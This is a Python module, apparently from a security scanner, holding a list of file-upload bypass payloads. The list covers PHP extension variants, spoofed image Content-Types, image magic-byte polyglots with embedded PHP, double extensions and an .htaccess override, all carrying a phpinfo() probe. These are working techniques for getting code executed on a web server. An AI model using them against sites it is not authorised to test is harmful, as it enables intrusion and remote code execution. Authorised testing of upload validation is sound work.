"""文件上传漏洞 Payload 矩阵"""

# ========== 上传 Payload 矩阵 ==========
# 每个条目: (文件名, 文件内容, 绕过类型, 预期行为)
UPLOAD_PAYLOADS = [
    # --- 普通 PHP 文件 ---
    {
        "filename": "shell.php",
        "content": b'<?php phpinfo();?>',
        "content_type": "application/x-php",
        "bypass_type": "none",
        "description": "直接上传 PHP 文件",
    },
    # --- 扩展名绕过 ---
    {
        "filename": "shell.php5",
        "content": b'<?php phpinfo();?>',
        "content_type": "application/x-php",
        "bypass_type": "extension",
        "description": "使用 .php5 扩展名绕过",
    },
    {
        "filename": "shell.phtml",
        "content": b'<?php phpinfo();?>',
        "content_type": "application/x-php",
        "bypass_type": "extension",
        "description": "使用 .phtml 扩展名绕过",
    },
    {
        "filename": "shell.pHp",
        "content": b'<?php phpinfo();?>',
        "content_type": "application/x-php",
        "bypass_type": "extension_case",
        "description": "大小写混淆 .pHp",
    },
    {
        "filename": "shell.php.",
        "content": b'<?php phpinfo();?>',
        "content_type": "application/x-php",
        "bypass_type": "extension_dot",
        "description": "尾部加点 .php.",
    },
    # --- Content-Type 绕过 ---
    {
        "filename": "shell.jpg",
        "content": b'<?php phpinfo();?>',
        "content_type": "image/jpeg",
        "bypass_type": "content_type",
        "description": "Content-Type 伪装为 image/jpeg，但文件内容是 PHP 代码",
    },
    {
        "filename": "shell.png",
        "content": b'<?php phpinfo();?>',
        "content_type": "image/png",
        "bypass_type": "content_type",
        "description": "Content-Type 伪装为 image/png",
    },
    {
        "filename": "shell.gif",
        "content": b'<?php phpinfo();?>',
        "content_type": "image/gif",
        "bypass_type": "content_type",
        "description": "Content-Type 伪装为 image/gif",
    },
    # --- 魔法字节绕过 (图片马) ---
    {
        "filename": "shell_gif.php",
        "content": b'GIF89a\x00\x01\x00\x01\x00<?php phpinfo();?>',
        "content_type": "image/gif",
        "bypass_type": "magic_bytes_gif",
        "description": "GIF89a 魔法字节 + PHP 代码 (图片马)",
    },
    {
        "filename": "shell_png.php",
        "content": b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01<?php phpinfo();?>',
        "content_type": "image/png",
        "bypass_type": "magic_bytes_png",
        "description": "PNG 魔法字节 + PHP 代码",
    },
    {
        "filename": "shell_jpg.php",
        "content": b'\xff\xd8\xff\xe0\x00\x10JFIF\x00<?php phpinfo();?>',
        "content_type": "image/jpeg",
        "bypass_type": "magic_bytes_jpg",
        "description": "JPEG 魔法字节 + PHP 代码",
    },
    # --- 双扩展名 ---
    {
        "filename": "shell.php.jpg",
        "content": b'<?php phpinfo();?>',
        "content_type": "image/jpeg",
        "bypass_type": "double_extension",
        "description": "双扩展名 .php.jpg (利用 Apache 解析漏洞)",
    },
    {
        "filename": "shell.php;.jpg",
        "content": b'<?php phpinfo();?>',
        "content_type": "image/jpeg",
        "bypass_type": "double_extension_semicolon",
        "description": "分号分隔 .php;.jpg",
    },
    # --- .htaccess 配合 ---
    {
        "filename": ".htaccess",
        "content": b'AddType application/x-httpd-php .jpg',
        "content_type": "text/plain",
        "bypass_type": "htaccess",
        "description": "上传 .htaccess 使 .jpg 被解析为 PHP",
    },
]


def get_upload_payloads() -> list[dict]:
    """获取所有上传 Payload"""
    return UPLOAD_PAYLOADS


def get_payloads_by_type(bypass_type: str) -> list[dict]:
    """按绕过类型筛选 Payload"""
    return [p for p in UPLOAD_PAYLOADS if p["bypass_type"] == bypass_type]
